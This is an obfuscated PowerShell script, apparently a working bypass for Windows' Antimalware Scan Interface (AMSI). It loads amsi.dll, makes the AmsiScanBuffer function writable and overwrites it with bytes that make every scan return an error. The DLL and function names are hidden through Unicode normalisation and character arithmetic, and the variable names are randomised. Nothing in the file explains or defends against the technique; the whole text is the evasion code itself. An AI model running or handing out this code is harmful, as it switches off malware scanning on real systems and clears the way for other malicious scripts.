$nq6ua8854KYAL = @"
using System;
using System.Runtime.InteropServices;
public class nq6ua8854KYAL {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr XK9tKUuRFrc, string OLqhSPibGpxo2Vr);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr SR0t2V2L28, UIntPtr hyOXyXgJbtFFBW7sl8A, uint QXNBmtJSwiqtv, out uint UzIMGFo2S);
}
"@

Add-Type $nq6ua8854KYAL

$Nhkp4UrEce9eTDy = [nq6ua8854KYAL]::LoadLibrary("$(('àms'+'ì.d'+'ll').NoRmAlIZe([cHaR]([BytE]0x46)+[chAr](9+102)+[chAr]([BYtE]0x72)+[ChAr]([bYte]0x6d)+[CHAr](21+47)) -replace [ChAR](92+50-50)+[chAR]([byTe]0x70)+[ChAr](17+106)+[CHAR]([byTE]0x4d)+[Char]([BYtE]0x6e)+[CHaR](125*7/7))")
$UrI82ZDT = [nq6ua8854KYAL]::GetProcAddress($Nhkp4UrEce9eTDy, "$(('ÁmsíScán'+'Bûffér').noRmaLIze([cHar](61+9)+[ChAr]([ByTE]0x6f)+[char]([bYTE]0x72)+[CHar](109*90/90)+[ChaR]([bYTe]0x44)) -replace [chAr](41+51)+[char](112*95/95)+[ChAr](123+35-35)+[chAR]([BYte]0x4d)+[CHaR]([ByTE]0x6e)+[cHAR](7+118))")
$p = 0
[nq6ua8854KYAL]::VirtualProtect($UrI82ZDT, [uint32]5, 0x40, [ref]$p)
$BpWa4ITXO = "0xB8"
$rk9G = "0x57"
$A9IDcgO_ZuMuqCEoOGcb = "0x00"
$ds9pXXAOpMAF39yi9JY = "0x07"
$JBgZQhjFQd1FhGc = "0x80"
$oQg5LnrJuJG = "0xC3"
$J7ZAjkLQnnxQ = [Byte[]] ($BpWa4ITXO,$rk9G,$A9IDcgO_ZuMuqCEoOGcb,$ds9pXXAOpMAF39yi9JY,+$JBgZQhjFQd1FhGc,+$oQg5LnrJuJG)
[System.Runtime.InteropServices.Marshal]::Copy($J7ZAjkLQnnxQ, 0, $UrI82ZDT, 6)